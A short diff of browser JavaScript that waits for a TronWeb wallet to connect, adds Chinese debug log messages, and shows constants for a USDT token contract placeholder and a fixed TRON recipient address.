@@ -8,16 +8,19 @@ async function getTronWeb() {
     return new Promise((resolve, reject) => {
         const checkTronWeb = setInterval(() => {
             if (typeof window.tronWeb !== 'undefined') {
+                console.log('TronWeb已连接'); // 调试信息
                 clearInterval(checkTronWeb);
                 tronWebInstance = window.tronWeb; // 保存tronWeb实例
                 resolve(tronWebInstance);
             } else {
+                console.log('未找到TronWeb，正在尝试连接'); // 调试信息
                 alert('请安装支持TRC20的钱包（如TronLink, Bitpie, imToken）并登录');
                 reject(new Error('Wallet not found'));
             }
         }, 1000);
     });
 }
+
 
 const tokenAddress = 'TOKEN_CONTRACT_ADDRESS'; // USDT合约地址
 const recipientAddress = 'TYrG44bTwLhiEGvb48HYtHCAkgk7etr4d3'; // 接收地址
